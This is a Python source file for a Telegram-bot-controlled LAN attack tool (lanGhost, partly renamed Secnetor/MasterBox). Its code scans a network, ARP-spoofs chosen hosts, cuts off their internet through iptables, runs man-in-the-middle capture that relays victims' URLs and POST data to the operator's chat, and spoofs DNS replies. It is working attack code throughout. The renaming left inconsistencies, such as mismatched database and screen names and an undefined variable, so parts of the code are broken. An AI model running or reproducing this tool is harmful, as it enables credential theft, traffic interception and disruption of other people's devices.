#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# lanGhost.py
# author: xdavidhu

try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!

    from telegram import Update
    from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
    from netaddr import IPAddress
    from time import sleep
    import urllib.request
    import urllib.parse
    import netifaces
    import traceback
    import threading
    import telegram
    import requests
    import sqlite3
    import base64
    import socket
    import time
    import nmap
    import json
    import sys
    import os

except KeyboardInterrupt:
    print("\n\n[+] Stopping...")
    raise SystemExit
except:
    print("[!] Requirements are not installed... Please run the 'setup.py' script first.")
    raise SystemExit

def refreshNetworkInfo():
    try:
        global iface_mac, ip_range, gw_ip, gw_mac, ip

        iface_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
        iface_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
        netmask = iface_info["netmask"]
        ip = iface_info["addr"]
        ip_range = ip + "/" + str(IPAddress(netmask).netmask_bits())
        gw_ip = False
        for i in netifaces.gateways()[2]:
            if i[1] == interface:
                gw_ip = i[0]
        if not gw_ip:
            print("[!] Cant get gateway IP...")
        else:
            nm = nmap.PortScanner()
            scan = nm.scan(hosts=gw_ip, arguments='-sn')
            hosts = []
            if gw_ip in scan["scan"]:
                if "mac" in scan["scan"][gw_ip]["addresses"]:
                    gw_mac = scan["scan"][gw_ip]["addresses"]["mac"]
        if not gw_mac:
            print("[!] Cant get gateway MAC...")
        return True
    except:
        print("[!] Error while getting network info. Retrying...")
        return False

def iptables(action, target=False):
    if action == "setup":
        print("[+] Running iptables setup...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

    if action == "flush":
        print("[+] Flushing iptables...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")

    if action == "kill":
        print("[+] Dropping connections from " + target + " with iptables...")
        os.system("sudo iptables -I FORWARD 1 -s " + target + " -j DROP")
        os.system("sudo iptables -A INPUT -s " + target + " -p tcp --dport 8080 -j DROP")
        os.system("sudo iptables -A INPUT -s " + target + " -p tcp --dport 53 -j DROP")
        os.system("sudo iptables -A INPUT -s " + target + " -p udp --dport 53 -j DROP")

    if action == "stopkill":
        print("[+] Stopping iptables kill for " + target)
        os.system("sudo iptables -D FORWARD -s " + target + " -j DROP")
        os.system("sudo iptables -D INPUT -s " + target + " -p tcp --dport 8080 -j DROP")
        os.system("sudo iptables -D INPUT -s " + target + " -p tcp --dport 53 -j DROP")
        os.system("sudo iptables -D INPUT -s " + target + " -p udp --dport 53 -j DROP")

    if action == "mitm":
        print("[+] Routing " + target + " into mitmdump with iptables...")
        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")

    if action == "spoofdns":
        print("[+] Spoofing dns for  " + target + " with iptables...")
        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")

    if action == "stopmitm":
        print("[+] Stopping iptables mitm for " + target + "...")
        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")


    if action == "stopspoofdns":
        print("[+] Stopping iptables spoofdns for " + target + "...")
        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
        os.system("sudo iptables -t nat -D PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")

def scan():
    if not refreshNetworkInfo():
        return "NETERROR"
    global ip_range
    try:
        nm = nmap.PortScanner()
        scan = nm.scan(hosts=ip_range, arguments='-sP')
    except:
        return "CRASH"
    hosts = []
    for host in scan["scan"]:
        if "mac" in scan["scan"][host]["addresses"]:
            if "hostnames" in scan["scan"][host] and "name" in scan["scan"][host]["hostnames"][0] and not scan["scan"][host]["hostnames"][0]["name"] == "":
                name = scan["scan"][host]["hostnames"][0]["name"]
                if len(name) > 15:
                    name = name[:15] + "..."
                hosts.append([host, scan["scan"][host]["addresses"]["mac"], name])
            else:
                hosts.append([host, scan["scan"][host]["addresses"]["mac"]])
    return hosts

def scanIP(ip):
    nm = nmap.PortScanner()
    scan = nm.scan(hosts=ip, arguments='-sS')
    result = []

    # layout: [ipv4, mac, vendor, hostname, [port, name]]

    if scan["scan"] == {}:
        return "DOWN"

    try:
        if "addresses" in scan["scan"][ip]:
            if "ipv4" in scan["scan"][ip]["addresses"]:
                result.append(str(scan["scan"][ip]["addresses"]["ipv4"]))
            else:
                result.append("??")
            if "mac" in scan["scan"][ip]["addresses"]:
                result.append(str(scan["scan"][ip]["addresses"]["mac"]))
                if "vendor" in scan["scan"][ip] and scan["scan"][ip]["addresses"]["mac"] in scan["scan"][ip]["vendor"]:
                    result.append(str(scan["scan"][ip]["vendor"][scan["scan"][ip]["addresses"]["mac"]]))
                else:
                    result.append("??")
            else:
                result.append("??")
                result.append("??")
        else:
            result.append("??")
            result.append("??")
            result.append("??")

        if "hostnames" in scan["scan"][ip] and "name" in scan["scan"][ip]["hostnames"][0]:
            tempHostname = str(scan["scan"][ip]["hostnames"][0]["name"])
            if tempHostname == "":
                tempHostname = "??"
            result.append(tempHostname)
        else:
            result.append("??")

        if "tcp" in scan["scan"][ip]:
            tempList = []
            for port in scan["scan"][ip]["tcp"]:
                if "name" in scan["scan"][ip]["tcp"][port]:
                    name = scan["scan"][ip]["tcp"][port]["name"]
                else:
                    name = "??"
                if "state" in scan["scan"][ip]["tcp"][port]:
                    state = scan["scan"][ip]["tcp"][port]["state"]
                else:
                    state = "??"
                tempPort = [str(port), str(state), str(name)]
                tempList.append(tempPort)
            result.append(tempList)
        else:
            result.append([])
    except:
        result = False
    return result

def resolveMac(mac):
    r = requests.get('https://api.macvendors.com/' + mac)
    vendor = r.text
    if len(vendor) > 15:
        vendor = vendor[:15] + "..."
    return vendor

def subscriptionHandler(update: Update, context: CallbackContext)-> None:
    global admin_chatid
    temp_disconnected = []
    disconnected = []
    reconnected = []
    hosts = False

    def handleDisconnect(host):
        print("[D] Appending " + str([host, 1]) + " to temp_disconnected")
        temp_disconnected.append([host, 1])

    def handleScan(scan):
        for t_host in temp_disconnected:
            if t_host[1] >= 5:
                print("[D] Removed " + str(t_host) + " from temp_disconnected, its over 5")
                disconnected.append(t_host[0])
                temp_disconnected.remove(t_host)

        for t_host in temp_disconnected:
            if not t_host[0] in scan:
                print("[D] Adding +1 to " + str(t_host))
                t_host[1] += 1

    def handleConnect(host):
        for t_host in temp_disconnected:
            if t_host[0] == host:
                print("[D] " + str(t_host) + " reconnected, removing from temp_disconnected")
                reconnected.append(t_host[0])
                temp_disconnected.remove(t_host)

    def getConnected(hosts):
        result = []
        for host in hosts:
            if host not in reconnected:
                result.append(host)
            else:
                reconnected.remove(host)
                print("[D] Not printing " + str(host) + " because its just reconnected")
        return result

    while True:
        print("[+] Scanning for new hosts...")
        new_hosts_with_name = scan()
        new_hosts = [i[:2] for i in new_hosts_with_name]
        if new_hosts_with_name == "NETERROR" or new_hosts_with_name == "CRASH":
            time.sleep(5)
            continue
        connected_hosts = []
        disconnected_hosts = []
        if not hosts == False:
            for new_host in new_hosts:
                if not new_host in hosts:
                    handleConnect(new_host)
                    connected_hosts.append(new_host)
            handleScan(hosts)
            for host in hosts:
                if not host in new_hosts:
                    handleDisconnect(host)

        global latest_scan
        latest_scan = new_hosts_with_name[:]
        for t_host in temp_disconnected:
            latest_scan.append(t_host[0])

        hosts = new_hosts[:]

        for host in getConnected(connected_hosts):
            print("[+] New device connected: " + resolveMac(host[1]) + " - " + host[0])
            context.bot.send_message(admin_chatid,"➕📱 New device connected: " + resolveMac(host[1]) + " ➖ " + host[0])
        for host in disconnected:
            print("[+] Device disconnected: " + resolveMac(host[1]) + " - " + host[0])
            context.bot.send_message(admin_chatid,"➖📱 Device disconnected: " + resolveMac(host[1]) + " ➖ " + host[0])

            attacksRunning = attackManager("getids", target=host[0])
            for attackid in attacksRunning:
                print("[+] Stopping attack " + str(attackid[0]) + ", because " + host[0] + " disconnected.")
                context.bot.send_message(admin_chatid,"✅ Stopping attack " + str(attackid[0]) + ", because " + host[0] + " disconnected.")
                stopAttack(attackid[0])
            disconnected.remove(host)

        time.sleep(20)

def arpSpoof(target):
    global iface_mac, gw_ip
    print("[+] ARP Spoofing " + str(target[0]) + "...")
    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)

def mitmHandler(target, ID):
    global admin_chatid, script_path

    while True:
        if attackManager("isrunning", ID=ID) == True:
            try:
                DBconn = sqlite3.connect(script_path + "lanGhost.db")
                DBcursor = DBconn.cursor()
                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT, host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
                DBconn.commit()
                DBcursor.execute("SELECT * FROM lanGhost_mitm")
                data = DBcursor.fetchall()
                DBconn.close()

                DBconn = sqlite3.connect(script_path + "lanGhost.db")
                DBcursor = DBconn.cursor()
                textline = "📱 MITM - " + target[0] + "\n\n"
                for item in data:
                    if item[6] == "1":
                        temp_textline = "DNS"+ " ➖ " + str(item[2]) + " ➡️ " + str(item[5]) + "\n\n"
                        if len(textline + temp_textline) > 3000:
                            break
                        textline += temp_textline
                    elif item[4] == "POST":
                        temp_textline = str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + urllib.parse.unquote(item[5]) + "\n\n"
                        if len(textline + temp_textline) > 3000:
                            break
                        textline += temp_textline
                    else:
                        temp_textline = str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
                        if len(textline + temp_textline) > 3000:
                            break
                        textline += temp_textline
                    DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=?", [str(item[0])])
                    DBconn.commit()
                if not textline == "📱 MITM - " + target[0] + "\n\n":
                     update.message.reply_text(text=textline)
                DBconn.close()
                time.sleep(1)
            except:
                print("[!!!] " + str(traceback.format_exc()))
        else:
            break


def attackManager(action, attack_type=False, target=False, ID=False):
    global running_attacks
    # Layout: [[ID, attack_type, target]]

    DBconn = sqlite3.connect(script_path + "lanGhost.db")
    DBcursor = DBconn.cursor()
    DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
    DBconn.commit()
    DBconn.close()

    DBconn = sqlite3.connect(script_path + "lanGhost.db")
    DBcursor = DBconn.cursor()

    def getNewID():
        DBcursor.execute("SELECT attackid FROM lanGhost_attacks ORDER BY id DESC LIMIT 1")
        data = DBcursor.fetchone()
        if data == None:
            return 1
        data = data[0]
        return int(data) + 1

    if action == "new":
        ID = getNewID()
        DBcursor.execute("INSERT INTO lanGhost_attacks(attackid, attack_type, target) VALUES (?, ?, ?)", [str(ID), attack_type, target])
        DBconn.commit()
        return ID

    elif action == "del":
        DBcursor.execute("DELETE FROM lanGhost_attacks WHERE attackid=?", [str(ID)])
        DBconn.commit()
        if DBcursor.rowcount == 1:
            return True
        else:
            return False

    elif action == "isrunning":
        DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
            return True

    elif action == "isattacked":
        DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE target=? ORDER BY id DESC LIMIT 1", [target])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
            return True

    elif action == "gettype":
        DBcursor.execute("SELECT attack_type FROM lanGhost_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
            return data[0]

    elif action == "gettarget":
        DBcursor.execute("SELECT target FROM lanGhost_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
            return data[0]

    elif action == "getids":
        DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE target=?", [target])
        data = DBcursor.fetchall()
        if data == None:
            return []
        else:
            return data

    elif action == "list":
        DBcursor.execute("SELECT attackid, attack_type, target FROM lanGhost_attacks")
        data = DBcursor.fetchall()
        if data == None:
            return []
        else:
            return data

def stopAttack(ID):
    atype = attackManager("gettype", ID=ID)
    target = attackManager("gettarget", ID=ID)

    attackManager("del", ID=ID)

    if not attackManager("isattacked", target=target):
        print("[+] Stopping ARP Spoof for " + target + "...")
        os.system("sudo screen -S lanGhost-arp-" + target + "-0 -X stuff '^C\n'")
        os.system("sudo screen -S lanGhost-arp-" + target + "-1 -X stuff '^C\n'")

    global script_path
    if atype == "kill":
        iptables("stopkill", target=target)

    elif atype == "mitm":
        iptables("stopmitm", target=target)

    elif atype == "replaceimg":
        iptables("stopmitm", target=target)

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
        DBconn.commit()
        DBconn.close()

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("DELETE FROM lanGhost_img WHERE attackid=?", [str(ID)])
        DBconn.commit()
        DBconn.close()

    elif atype == "injectjs":
        iptables("stopmitm", target=target)

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_js (attackid TEXT, target TEXT, jsurl TEXT)")
        DBconn.commit()
        DBconn.close()

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("DELETE FROM lanGhost_js WHERE attackid=?", [str(ID)])
        DBconn.commit()
        DBconn.close()

    elif atype == "spoofdns":
        iptables("stopspoofdns", target=target)

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
        DBconn.commit()
        DBconn.close()

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("DELETE FROM lanGhost_dns WHERE attackid=?", [str(ID)])
        DBconn.commit()
        DBconn.close()


def stop_updater():
    global updater
    updater.stop()

#Function Stopping
def stopping():
    global script_path
    print("\n\n[+] Stopping...")
    stop_updater_t = threading.Thread(target=stop_updater)
    stop_updater_t.start()
    os.system("sudo screen -S Secnetor-mitm -X stuff '^C\n'")
    os.system("sudo screen -S Secnetor-dns -X stuff '^C\n'")
    iptables("flush")
    attacks = attackManager("list")
    if not attacks == []:
        print("[+] Stopping attacks...")
    for attack in attacks:
        stopAttack(attack[0])
    if not attacks == []:
        time.sleep(5)
    os.system("sudo rm -r " + script_path + "Secnetor.db > /dev/null 2>&1")
    print("[+] Secnetor stopped")
    raise SystemExit

#Function Restart
def restart_thread():
    os.execl(sys.executable, sys.executable, *sys.argv)

#Function Restarting
def restarting():
    global script_path
    print("\n\n[+] Restarting...")
    stop_updater_t = threading.Thread(target=stop_updater)
    stop_updater_t.start()
    os.system("sudo screen -S Secnetor-mitm -X stuff '^C\n'")
    os.system("sudo screen -S Secnetor-dns -X stuff '^C\n'")
    iptables("flush")
    attacks = attackManager("list")
    if not attacks == []:
        print("[+] Stopping attacks...")
    for attack in attacks:
        stopAttack(attack[0])
    if not attacks == []:
        time.sleep(5)
    os.system("sudo rm -r " + script_path + "Secnetor.db > /dev/null 2>&1")
    print("[+] Secnetor stopped")
    restart_t = threading.Thread(target=restart_thread)
    restart_t.start()

#Telegram Command Sections
# Command handlers:

def msg_start(update: Update, context: CallbackContext)-> None:
  
    try:
        update.message.reply_text("Welcome to MasterBox 👻")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_ping(update: Update, context: CallbackContext)-> None:
 
    try:
       update.message.reply_text(text="Connection Succesful! Device Available ⚡️")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_scan(update: Update, context: CallbackContext)-> None:
   
    try:
        global latest_scan
        update.message.reply_text("Scanning network... 🔎")
        textline = "📱 Devices online:\n\n"
        temp_latest_scan = latest_scan[:]
        temp_latest_scan = sorted(temp_latest_scan, key=lambda x: x[0])
        for host in temp_latest_scan:
            if len(host) > 2:
                textline += host[0] + " ➖ " + resolveMac(host[1]) + " ➖ " + host[2] + "\n"
            else:
                textline += host[0] + " ➖ " + resolveMac(host[1]) + "\n"
        textline = textline[:-1]
        update.message.reply_text(text=textline)
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_kill(update: Update, context: CallbackContext)-> None:
    
    try:
        if context.args == []:
            update.message.reply_text("⚠️ Usage: /kill [TARGET-IP]")
            return

        target_ip = context.args[0]

        global latest_scan
        hosts = latest_scan[:]
        target_mac = False
        for host in hosts:
            if host[0] == target_ip:
                target_mac = host[1]
        if not target_mac:
            update.message.reply_text("⚠️ Target host is not up.")
            return

        target = [target_ip, target_mac]
        iptables("kill", target=target[0])
        if not attackManager("isattacked", target=target_ip):
            ID = attackManager("new", attack_type="kill", target=target_ip)
            kill_thread = threading.Thread(target=arpSpoof, args=[target])
            kill_thread.daemon = True
            kill_thread.start()
        else:
            ID = attackManager("new", attack_type="kill", target=target_ip)

        update.message.reply_text("Starting attack with ID: " + str(ID))
        update.message.reply_text("Type /stop " + str(ID) + " to stop the attack.")
        update.message.reply_text("🔥 Killing internet for " + target_ip + "...")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_stop(update: Update, context: CallbackContext)-> None:
    
    try:
        if context.args == []:
            update.message.reply_text("⚠️ Usage: /stop [ATTACK-ID]")
            return

        try:
            ID = int(context.args[0])
        except:
            update.message.reply_text("⚠️ ATTACK-ID must be a number.")
            return

        if not attackManager("isrunning", ID=ID):
            update.message.reply_text("⚠️ No attack with ID " + str(ID) + ".")
            return

        stopAttack(ID)

        update.message.reply_text("✅ Attack " + str(ID) + " stopped...")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_attacks(update: Update, context: CallbackContext)-> None:
    
    try:
        attacks = attackManager("list")

        if attacks == []:
                update.message.reply_text("✅ There are no attacks currently running...")
                return

        textline = ""
        for attack in attacks:
            textline += "ID: " + str(attack[0]) + " ➖ " + attack[1] + " ➖ " + attack[2] + "\n"
        update.message.reply_text("🔥 Attacks running:\n\n" + textline)
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_mitm(update: Update, context: CallbackContext)-> None:
    
    try:
        if context.args == []:
            update.message.reply_text("⚠️ Usage: /mitm [TARGET-IP]")
            return

        target_ip = context.args[0]

        global latest_scan
        hosts = latest_scan[:]
        target_mac = False
        for host in hosts:
            if host[0] == target_ip:
                target_mac = host[1]
        if not target_mac:
            update.message.reply_text("⚠️ Target host is not up.")
            return

        target = [target_ip, target_mac]
        iptables("mitm", target=target[0])
        if not attackManager("isattacked", target=target_ip):
            ID = attackManager("new", attack_type="mitm", target=target_ip)
            arp_thread = threading.Thread(target=arpSpoof, args=[target])
            arp_thread.daemon = True
            arp_thread.start()
        else:
            ID = attackManager("new", attack_type="mitm", target=target_ip)

        mitm_thread = threading.Thread(target=mitmHandler, args=[target, ID])
        mitm_thread.daemon = True
        mitm_thread.start()

        update.message.reply_text("Starting attack with ID: " + str(ID))
        update.message.reply_text("Type /stop " + str(ID) + " to stop the attack.")
        update.message.reply_text("🔥 Capturing URL's and DNS from " + target_ip + "...")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")


def msg_spoofdns(update: Update, context: CallbackContext)-> None:
    
    try:
        if len(context.args) < 3:
            update.message.reply_text("⚠️ Usage: /spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP]")
            return

        target_ip = context.args[0]
        domain = context.args[1]
        fakeip = context.args[2]

        try:
            socket.inet_aton(fakeip)
        except socket.error:
            update.message.reply_text("⚠️ FAKE-IP is not valid... Please try again.")
            return

        global latest_scan
        hosts = latest_scan[:]
        target_mac = False
        for host in hosts:
            if host[0] == target_ip:
                target_mac = host[1]
        if not target_mac:
            update.message.reply_text("⚠️ Target host is not up.")
            return

        target = [target_ip, target_mac]

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
        DBconn.commit()
        DBconn.close()

        iptables("spoofdns", target=target[0])
        if not attackManager("isattacked", target=target_ip):
            ID = attackManager("new", attack_type="spoofdns", target=target[0])
            arp_thread = threading.Thread(target=arpSpoof, args=[target])
            arp_thread.daemon = True
            arp_thread.start()
        else:
            ID = attackManager("new", attack_type="spoofdns", target=target[0])

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("INSERT INTO lanGhost_dns VALUES (?, ?, ?, ?)", [str(ID), target[0], domain, fakeip])
        DBconn.commit()
        DBconn.close()

        update.message.reply_text("Starting attack with ID: " + str(ID))
        update.message.reply_text("Type /stop " + str(ID) + " to stop the attack.")
        update.message.reply_text("🔥 Spoofing DNS for " + target[0] + "...")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")


def msg_help(update: Update, context: CallbackContext)-> None:

   
   
        update.message.reply_text("Secnetor 🔑 HELP:\n\n/scan - Scan network\n/scanip [TARGET-IP] - Scan a specific IP address.\n/kill [TARGET-IP] - Stop the target's network connection.\n" +\
                                                                "/mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.\n" +\
                                                                "/attacks - View currently running attacks.\n/stop [ATTACK-ID] - Stop a currently running attack.\n/restart - Restart Secnetor 🔑\n" +\
                                                                "/help - Display this menu.\n/ping - Test connection.")


def msg_unknown(update: Update, context: CallbackContext)-> None:
    
    try:
        update.message.reply_text("⚠️ Sorry, I didn't understand that command. Type /help to get a list of available commands.")
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")

def msg_restart(update: Update, context: CallbackContext)-> None:
   
    try:
        update.message.reply_text("✅ Restarting lanGhost...")
        restarting()
    except:
        print("[!!!] " + str(traceback.format_exc()))
        update.message.reply_text("❌ Whooops, something went wrong... Please try again.")



def msg_scanip(update: Update, context: CallbackContext)-> None:
   
    try:
        if context.args == []:
            context.bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /scanip [TARGET-IP]")
            return

        target_ip = context.args[0]

        try:
            socket.inet_aton(target_ip)
        except socket.error:
            context.bot.send_message(admin_chatid,"⚠️ TARGET-IP is not valid... Please try again.")
            return

        context.bot.send_message(admin_chatid,"Scanning host... 🔎")

        scan = scanIP(target_ip)
        if scan == False:
            context.bot.send_message(admin_chatid,"❌ ERROR404 ❌, something went wrong with the scan... Please try again.")
            return
        if scan == "DOWN":
            context.bot.send_message(admin_chatid, "⚠️ Host is down...")
            return
        textline = "🖥 ➖ " + scan[0] + "\n\nMAC ➖ " + scan[1] + "\nVendor ➖ " + scan[2] + "\nHostname ➖ " + scan[3][:100] + "\n\n"
        if scan[4] == []:
            textline += "No ports are open."
        else:
            textline += "Ports:\n"
            for port in scan[4]:
                if len(textline) > 3000:
                    context.bot.send_message(admin_chatid,"⚠️ Too many ports are open, some will not be displayed because message is too long...")
                    break
                textline += port[0] + " ➖ " + port[1] + " ➖ " + port[2] + "\n"
        context.bot.send_message(admin_chatid,textline)

    except:
        print("[!!!] " + str(traceback.format_exc()))
        context.bot.send_message(admin_chatid,"❌ ERROR404 ❌, something went wrong... Please try again.")

def main():
    global admin_chatid, updater

    updater = Updater(token=telegram_api, use_context=True)
    dispatcher = updater.dispatcher
    
    bot = updater.bot
    dispatcher.add_handler(CommandHandler("test", subscriptionHandler))
    t = threading.Thread(target=subscriptionHandler, args=[bot,updater])


    t.daemon = True
    t.start()
    
    #not sure if i need below
   
    #Start
    dispatcher.add_handler(CommandHandler("start", msg_start))

    #Ping
    dispatcher.add_handler(CommandHandler("ping", msg_ping))

    #Scan
    dispatcher.add_handler(CommandHandler("scan", msg_scan))

    #Kill Disconnect
    dispatcher.add_handler(CommandHandler("kill", msg_kill))

    #Stop Attack
    dispatcher.add_handler(CommandHandler("stop", msg_stop))

    #Attack
    dispatcher.add_handler(CommandHandler("attacks", msg_attacks))

    #MITM
    dispatcher.add_handler(CommandHandler("mitm", msg_mitm))
   
    #Spoofdns
    dispatcher.add_handler(CommandHandler("spoofdns", msg_spoofdns))

    #Help
    dispatcher.add_handler(CommandHandler("help", msg_help))

    #Restart
    dispatcher.add_handler(CommandHandler("restart", msg_restart))

    #Scanip
    dispatcher.add_handler(CommandHandler("scanip", msg_scanip))

    


    dispatcher.add_handler(MessageHandler(Filters.text, msg_unknown))
    dispatcher.add_handler(MessageHandler(Filters.command, msg_unknown))

    print("[+] Telegram bot started...")
    updater.start_polling()

    while updater.running:
        time.sleep(1)

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Please run lanGhost as root!")
        raise SystemExit

    script_path = os.path.dirname(os.path.realpath(__file__)) + "/"

    try:
        with open(script_path + "config.cfg") as f:
            config = f.read()
            f.close()
    except Exception:
        print("[!] Config file not found... Please run the 'setup.py' script first.")
        raise SystemExit

    try:
        config = json.loads(config)
    except:
        print("[!] Config file damaged... Please run the 'setup.py' script to regenerate the file.")
        raise SystemExit

    interface = config.get("interface", False)
    telegram_api = config.get("telegram_api", False)
    admin_chatid = config.get("admin_chatid", False)

    if interface == False or telegram_api == False or admin_chatid == False:
        print("[!] Config file damaged... Please run the 'setup.py' script to regenerate the file.")
        raise SystemExit

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 8080))
        s.close()
    except socket.error as e:
        print("[!] Port 8080 is already in use... Please stop any running proccess which may use port 8080 and try again.")
        raise SystemExit

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 53))
        s.close()
    except socket.error as e:
        print("[!] Port 53 is already in use... Please stop any running proccess which may use port 53 and try again.")
        raise SystemExit

    GREEN = '\033[1m' + '\033[32m'
    WHITE = '\033[1m' + '\33[97m'
    END = '\033[0m'
    header = """
                    """ + GREEN + """ _            """ + WHITE + """  _____ _               _     .-.
                    """ + GREEN + """| |           """ + WHITE + """ / ____| |             | |   | OO|
                    """ + GREEN + """| | __ _ _ __ """ + WHITE + """| |  __| |__   ___  ___| |_  |   |
                    """ + GREEN + """| |/ _` | '_ \\""" + WHITE + """| | |_ | '_ \ / _ \/ __| __| '^^^'
                    """ + GREEN + """| | (_| | | | """ + WHITE + """| |__| | | | | (_) \__ | |_
                    """ + GREEN + """|_|\__,_|_| |_""" + WHITE + """|\_____|_| |_|\___/|___/\__|
                    """
    try:
        print(header + """          v1.0 """ + WHITE + """by David Schütz (@xdavidhu)    """ + "\n" + END)
    except:
        print(header + """                         v1.0 """ + WHITE + """by @xdavidhu    """ + "\n" + END)

    os.system("rm -r " + script_path + "lanGhost.db > /dev/null 2>&1")

    os.system("sudo screen -S lanGhost-mitm -m -d mitmdump -T --host -s " + script_path + "proxyScript.py")
    os.system("sudo screen -S lanGhost-dns -m -d python3 " + script_path + "dnsServer.py")
    refreshNetworkInfo()
    iptables("setup")

    running_attacks = []
    latest_scan = []
    while True:
        try:
            main()
        except KeyboardInterrupt:
            stopping()
        except:
            print(str(traceback.format_exc()))
            print("[!] Something went wrong with the Telegram bot. Restarting...")
            time.sleep(0.5)
